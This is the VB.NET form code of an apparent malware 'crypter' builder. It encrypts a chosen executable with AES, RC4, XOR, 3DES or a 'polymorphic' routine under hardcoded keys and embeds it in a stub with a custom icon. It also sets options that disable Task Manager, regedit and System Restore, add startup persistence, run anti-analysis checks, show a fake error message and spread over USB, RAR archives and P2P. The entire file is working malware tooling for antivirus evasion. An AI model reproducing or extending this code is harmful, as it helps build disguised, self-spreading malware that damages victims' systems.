Imports System.Text
Imports System.Security.Cryptography

Public Class Form1

    Dim Server, Iconz, BuildString As String
    Dim taskmanager, regedit, systemrestore, cmder, runmer, rclicker, avwebsites, cpaneler As Boolean
    Dim meltz, startupz, antisz, fakemsg, installz As Boolean
    Dim titlz, msgz, directz As String
    Dim Cryption, showyenc As String
    Dim usbizzle, rarizzle, p2pizzle As Boolean
    Dim stub As String
  

#Region "Buttons"

    Private Sub CyberTopButton1_Click(sender As System.Object, e As System.EventArgs) Handles CloseBtn.Click
        Me.Close()
    End Sub

    Private Sub CyberTopButton2_Click(sender As System.Object, e As System.EventArgs) Handles MiniBtn.Click
        Me.WindowState = FormWindowState.Minimized

    End Sub

    Private Sub CyberButton1_Click(sender As System.Object, e As System.EventArgs) Handles OpenFileBtn.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Executables *.exe|*.exe"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            Server = ofd.FileName
            InputFileText.Text = ofd.FileName
        End If
    End Sub

    Private Sub Stub_Click(sender As System.Object, e As System.EventArgs) Handles BtnStub.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Executables *.exe|*.exe"
        ofd.InitialDirectory = Application.StartupPath + "\Stubs"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            InputStubText.Text = ofd.FileName
            stub = InputStubText.Text
        End If
    End Sub

    Private Sub OpenIconBtn_Click(sender As System.Object, e As System.EventArgs) Handles OpenIconBtn.Click

        Dim ofd As New OpenFileDialog
        ofd.Filter = "Icon *.ico|*.ico"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            Iconz = ofd.FileName
            InputIconText.Text = ofd.FileName
        End If
    End Sub

    Private Sub RandBtn_Click(sender As System.Object, e As System.EventArgs) Handles RandBtn.Click
        EncKeyText.Text = MyRandom.GenerateRandomString(True, True, True, False, 40)
    End Sub

    Private Sub CyberButton5_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton5.Click
        System.Diagnostics.Process.Start("http://www.hackforums.net/private.php?action=send")
    End Sub

#End Region

#Region "CryptBTN"

    Private Sub CryptBtn_Click(sender As System.Object, e As System.EventArgs) Handles CryptBtn.Click

        If InputFileText.Text = "Browse For A File To Crypt..." Then
            MessageBox.Show("Please Choose A File To Crypt!", "Input A File", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Exit Sub

        ElseIf InputFileText.Text = "" Then
            MessageBox.Show("Please Choose A File To Crypt!", "Input A File", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)

            Exit Sub
        Else
        End If

        If InputStubText.Text = "Browse For A Stub To Use..." Then
            MessageBox.Show("Please Choose A Stub!", "Input A Stub", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Exit Sub
        ElseIf InputStubText.Text = "" Then
            MessageBox.Show("Please Choose A Stub!", "Input A Stub", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Exit Sub
        Else
        End If

        If EncKeyText.Text = "Encryption Key" Then
            MessageBox.Show("Please Generate An Encryption Key!", "Input An Encryption Key", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Exit Sub
        ElseIf EncKeyText.Text = "" Then
            MessageBox.Show("Please Generate An Encryption Key!", "Input An Encryption Key", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Exit Sub
        Else
        End If

        Try
            Dim sfd1 As New SaveFileDialog
            sfd1.DefaultExt = "exe"
            sfd1.Filter = "Executable Files (*.Exe)|*.Exe"
            If sfd1.ShowDialog = Windows.Forms.DialogResult.OK Then
            End If

            Dim filein As String
            FileOpen(1, Server, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            filein = Space(LOF(1))
            FileGet(1, filein)
            FileClose(1)


            IO.File.Copy(stub, sfd1.FileName)

            GetFakeMessage()
            GetDisables()
            GetOptions()
            GetInstallz()

            If AESRadio.Checked = True Then
                Cryption = "AES"
                showyenc = "Advanced Encryption Standard"
                BuildString = "FileLife" & AES.Rijndaelcrypt(filein, "*?Gs&WPC/KmXCbCo{d5.(75e~BG_HPt4[l6,sv)pzVJF$N|{_x{w6-@Ju`cwp/THISISAES") & "FileLife" & Cryption & "FileLife" & taskmanager & "FileLife" & regedit & "FileLife" & systemrestore & "FileLife" & meltz & "FileLife" & startupz & "FileLife" & antisz & "FileLife" & fakemsg & "FileLife" & titlz & "FileLife" & msgz & "FileLife" & installz & "FileLife" & directz & "FileLife" & rarizzle & "FileLife" & usbizzle & "FileLife" & p2pizzle & "FileLife" & antisz
            ElseIf polystairsradio.Checked = True Then
                Cryption = "Pstairs"
                showyenc = "Polymorphic Stair"
                BuildString = "FileLife" & PolyMorphicStairs.PolyCrypt(filein, "Uj&#j')Nn&G`yMMC_(_ex#'cv`8=0G\{)S*22blV{1/Ntpl,t'zJxn\yY_>q6POLYMORPHICSTARIISSS@@##$@") & "FileLife" & Cryption & "FileLife" & taskmanager & "FileLife" & regedit & "FileLife" & systemrestore & "FileLife" & meltz & "FileLife" & startupz & "FileLife" & antisz & "FileLife" & fakemsg & "FileLife" & titlz & "FileLife" & msgz & "FileLife" & installz & "FileLife" & directz & "FileLife" & rarizzle & "FileLife" & usbizzle & "FileLife" & p2pizzle & "FileLife" & antisz
            ElseIf xorradio.Checked = True Then
                Cryption = "XOR"
                showyenc = "Symmetric and Xor"
                BuildString = "FileLife" & CustomXOR_Encrypt(filein, "//Salmoneus//") & "FileLife" & Cryption & "FileLife" & taskmanager & "FileLife" & regedit & "FileLife" & systemrestore & "FileLife" & meltz & "FileLife" & startupz & "FileLife" & antisz & "FileLife" & fakemsg & "FileLife" & titlz & "FileLife" & msgz & "FileLife" & installz & "FileLife" & directz & "FileLife" & rarizzle & "FileLife" & usbizzle & "FileLife" & p2pizzle & "FileLife" & antisz
            ElseIf RC4Radio.Checked = True Then
                Cryption = "RC4"
                showyenc = "RC4"
                BuildString = "FileLife" & RC4.ARC4.rc4(filein, "AJq44U01sKBegSDBlF2rBmpWvIZgHijL3AfDRMEbFQpVwjNS0qSr49P7cgxYaXWAllegded4ofteharcz") & "FileLife" & Cryption & "FileLife" & taskmanager & "FileLife" & regedit & "FileLife" & systemrestore & "FileLife" & meltz & "FileLife" & startupz & "FileLife" & antisz & "FileLife" & fakemsg & "FileLife" & titlz & "FileLife" & msgz & "FileLife" & installz & "FileLife" & directz & "FileLife" & rarizzle & "FileLife" & usbizzle & "FileLife" & p2pizzle & "FileLife" & antisz
            ElseIf desradio.Checked = True Then
                Cryption = "3DES"
                showyenc = "Triple DES"
                BuildString = "FileLife" & _3DES.Encrypt(filein, "9oBha4fSkcqM4BdroQ4nQtac1cjNqVxW6jGIkpadhOqUDAogOLMyCAkKKLG6eOBTRiple3des!@mofthaefuckerrrzE4A8FA35B33A075F1BD9606778B5D527B2863F1D6C5516DF71C1D939B442E007", True) & "FileLife" & Cryption & "FileLife" & taskmanager & "FileLife" & regedit & "FileLife" & systemrestore & "FileLife" & meltz & "FileLife" & startupz & "FileLife" & antisz & "FileLife" & fakemsg & "FileLife" & titlz & "FileLife" & msgz & "FileLife" & installz & "FileLife" & directz & "FileLife" & rarizzle & "FileLife" & usbizzle & "FileLife" & p2pizzle & "FileLife" & antisz
            Else : Exit Sub
            End If

            Dim StringtoByte As Byte() = Encoding.Default.GetBytes(BuildString)

            ResourceWriter.WriteResource(sfd1.FileName, StringtoByte)

            If InputIconText.Text = "Browse For An Icon To Use..." Then
            ElseIf InputIconText.Text = "" Then
            Else : IconChanger.InjectIcon(sfd1.FileName, Iconz)
            End If

            MessageBox.Show("File Has Been Encrypted Using The " + showyenc + " Cipher!", "File Encrypted Succesfully", MessageBoxButtons.OK, MessageBoxIcon.Information)

        Catch ex As Exception

            MessageBox.Show(":( Something Went Wrong!", "Ooops!", MessageBoxButtons.OK, MessageBoxIcon.Error)

        End Try

    End Sub
#End Region

#Region "Xor"
    Public Function CustomXOR_Encrypt(ByVal Input As String, ByVal pass As String) As String
        Dim out As New System.Text.StringBuilder
        Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim XorHash As Byte() = Hash.ComputeHash(System.Text.Encoding.ASCII.GetBytes(pass))
        Dim u As Integer
        For i As Integer = 0 To Input.Length - 1
            Dim tmp As String = Hex(Asc(Input(i)) Xor XorHash(u))
            If tmp.Length = 1 Then tmp = "0" & tmp
            out.Append(tmp)
            If u = pass.Length - 1 Then u = 0 Else u = u + 1
        Next
        Return out.ToString
    End Function
#End Region

#Region "ByteArray"
    Public Shared Function StrToByteArray(str As String) As Byte()

        Dim encoding As New System.Text.ASCIIEncoding()

        Return encoding.GetBytes(str)

    End Function
#End Region

#Region "Installz"
    Public Sub GetInstallz()
        If InstallCheck.CheckedState = True Then
            installz = True
            directz = AppdataDirec.Text
        Else : installz = False
        End If
    End Sub
#End Region

#Region "Dimz3"
    Public Sub GetFakeMessage()
        If FakeErrorCheck.CheckedState = True Then
            fakemsg = True
            titlz = FETitle.Text
            msgz = FEMessage.Text
        Else : fakemsg = False
        End If
    End Sub
#End Region

#Region "Dimz2"
    Public Sub GetOptions()
        If melt.CheckedState = True Then
            meltz = True
        Else : meltz = False
        End If

        If startup.CheckedState = True Then
            startupz = True
        Else : startupz = False
        End If

        If antis.CheckedState = True Then
            antisz = True
        Else : antisz = False
        End If

        If UsbSpread.CheckedState = True Then
            usbizzle = True
        Else : usbizzle = False
        End If

        If RarCheck.CheckedState = True Then
            rarizzle = True
        Else : rarizzle = False
        End If

        If p2pcheck.CheckedState = True Then
            p2pizzle = True
        Else : p2pizzle = False
        End If

        If antis.CheckedState = True Then
            antisz = True
        Else : antisz = False
        End If

    End Sub
#End Region

#Region "Dimz"
    Public Sub GetDisables()
        If Task.CheckedState = True Then
            taskmanager = True
        Else : taskmanager = False
        End If

        If Edit.CheckedState = True Then
            regedit = True
        Else : regedit = False
        End If

        If Restore.CheckedState = True Then
            systemrestore = True
        Else : systemrestore = False
        End If


    End Sub
#End Region

End Class

